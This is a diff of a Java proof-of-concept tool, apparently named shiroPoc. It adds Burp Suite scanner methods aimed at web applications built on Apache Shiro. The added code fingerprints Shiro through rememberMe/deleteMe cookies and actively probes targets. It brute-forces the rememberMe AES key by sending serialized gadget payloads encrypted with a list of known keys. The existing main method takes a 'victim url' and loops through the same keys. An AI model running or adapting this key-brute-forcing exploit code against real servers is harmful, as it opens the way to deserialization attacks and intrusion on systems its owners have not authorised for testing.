@@ -1,6 +1,7 @@
 package org.unicodesec;
 
 
+import burp.*;
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import org.apache.http.Header;
 import org.apache.http.HttpHeaders;
@@ -13,21 +14,13 @@ import yso.payloads.Strings;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
+import java.io.PrintWriter;
 import java.util.LinkedList;
 import java.util.List;
 
 public class poc {
     public static void main(String[] args) throws Exception {
-        String text = "   _____   _       _                  ______          _               _______                   _       \n" +
-                "  / ____| | |     (_)                |  ____|        | |             |__   __|                 | |      \n" +
-                " | (___   | |__    _   _ __    ___   | |__      ___  | |__     ___      | |      ___     ___   | |  ___ \n" +
-                "  \\___ \\  | '_ \\  | | | '__|  / _ \\  |  __|    / __| | '_ \\   / _ \\     | |     / _ \\   / _ \\  | | / __|\n" +
-                "  ____) | | | | | | | | |    | (_) | | |____  | (__  | | | | | (_) |    | |    | (_) | | (_) | | | \\__ \\\n" +
-                " |_____/  |_| |_| |_| |_|     \\___/  |______|  \\___| |_| |_|  \\___/     |_|     \\___/   \\___/  |_| |___/\n" +
-                "                                                                                                        \n" +
-                "                                                                  Powered by UnicodeSec                 \n" +
-                "                                                                  Version  0.0.3                        ";
-        System.out.println(text);
+        System.out.println(Version.text);
         if (args.length == 0) {
             System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
             System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url] shiroKey");
@@ -56,17 +49,16 @@ public class poc {
 
         String victimUrl = args[0];
         String key = "";
-        if (args.length == 2){
+        if (args.length == 2) {
             key = args[1];
-            if (Base64.decode(key).length != 16){
+            if (Base64.decode(key).length != 16) {
                 System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
             }
         }
         CloseableHttpClient httpclient = HttpClients.createDefault();
-        if (key.length() >0){
+        if (key.length() > 0) {
             if (detectShiroVuln(victimUrl, httpclient, key)) return;
-        }
-        else{
+        } else {
             for (int i = 0; i < keys.keys.length; i++) {
                 if (detectShiroVuln(victimUrl, httpclient, keys.keys[i])) return;
             }
@@ -119,6 +111,107 @@ public class poc {
         objectOutputStream.writeObject(obj);
         objectOutputStream.flush();
         return byteArrayOutputStream.toByteArray();
+    }
+
+    public static CustomScanIssue creteCustomScanIssue(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, PrintWriter stdout) {
+        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
+        String detail = String.format("detect shiro framework in %s", requestInfo.getUrl());
+        stdout.println(detail);
+
+        return new CustomScanIssue(
+                iHttpRequestResponse.getHttpService(),
+                requestInfo.getUrl(),
+                new IHttpRequestResponse[]{iHttpRequestResponse},
+                String.format("%s Shiro framework", requestInfo.getUrl()),
+                detail,
+                "Information");
+    }
+
+    public static IScanIssue shiroDetect(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks) {
+        // 检测目标服务器是否存在shiro框架
+        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
+        IResponseInfo responseInfo = helpers.analyzeResponse(iHttpRequestResponse.getResponse());
+        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
+
+        // check if response set-cookie headers containss rememberMe
+        for (ICookie cookie : responseInfo.getCookies()) {
+            if (cookie.getName().contains("rememberMe") || cookie.getValue().contains("deleteMe")) {
+                return creteCustomScanIssue(iHttpRequestResponse, helpers, stdout);
+            }
+        }
+
+        // check rsequest header
+        List<String> headers = requestInfo.getHeaders();
+        for (String header : headers) {
+            if (header.contains("rememberMe")) {
+                return creteCustomScanIssue(iHttpRequestResponse, helpers, stdout);
+            }
+        }
+
+        // 主动发包探测一下
+        IHttpService httpService = iHttpRequestResponse.getHttpService();
+
+        IParameter newParameter = helpers.buildParameter("rememberMe", "1", (byte) 2);
+        byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
+        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
+
+        IResponseInfo newResponseInfo = helpers.analyzeResponse(newHttpRequestResponse.getResponse());
+        for (ICookie cookie : newResponseInfo.getCookies()) {
+            if (cookie.getName().contains("rememberMe") || cookie.getValue().contains("deleteMe")) {
+                return creteCustomScanIssue(newHttpRequestResponse, helpers, stdout);
+            }
+        }
+        // 什么都没有返回null
+        return null;
+    }
+
+    public static IScanIssue shiroKey(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks) throws Exception {
+        // 检测shiro的key
+        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
+        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
+
+        IHttpService httpService = iHttpRequestResponse.getHttpService();
+        for (int i = 0; i < keys.keys.length; i++) {
+            IResponseInfo newResponseInfo = getiResponseInfo(iHttpRequestResponse, helpers, callbacks, httpService, keys.keys[i]);
+            boolean isDeleteMe = false;
+            for (ICookie cookie : newResponseInfo.getCookies()) {
+                if (cookie.getName().contains("rememberMe") && cookie.getValue().contains("deleteMe")) {
+                    isDeleteMe = true;
+                }
+            }
+            if (isDeleteMe == false) {
+                // 说明可能已经检测到shiro密钥，需要设置一个不存在的key
+                String randomKey = "MTIzNDU2NzgxMjM0NTY3OA==";
+                IResponseInfo newResponseInfo1 = getiResponseInfo(iHttpRequestResponse, helpers, callbacks, httpService, randomKey);
+                for (ICookie cookie : newResponseInfo1.getCookies()) {
+                    if (cookie.getName().contains("rememberMe") && cookie.getValue().contains("deleteMe")) {
+                        // 如果真的用shiro，设置一个随机的key。一定返回deleteMe
+                        String detail = String.format("detect shiro key %s in %s", keys.keys[i], requestInfo.getUrl());
+                        stdout.println(detail);
+
+                        return new CustomScanIssue(
+                                iHttpRequestResponse.getHttpService(),
+                                requestInfo.getUrl(),
+                                new IHttpRequestResponse[]{iHttpRequestResponse},
+                                String.format("%s ShiroCipherKey %s", requestInfo.getUrl(), keys.keys[i]),
+                                detail,
+                                "High");
+                    }
+                }
+
+            }
+        }
+        // 什么都没有返回null
+        return null;
+    }
+
+    private static IResponseInfo getiResponseInfo(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, IHttpService httpService, String key) throws Exception {
+        byte[] bytes = MakeGadget();
+        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
+        IParameter newParameter = helpers.buildParameter("rememberMe", rememberMe, (byte) 2);
+        byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
+        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
+        return helpers.analyzeResponse(newHttpRequestResponse.getResponse());
     }
 
 }
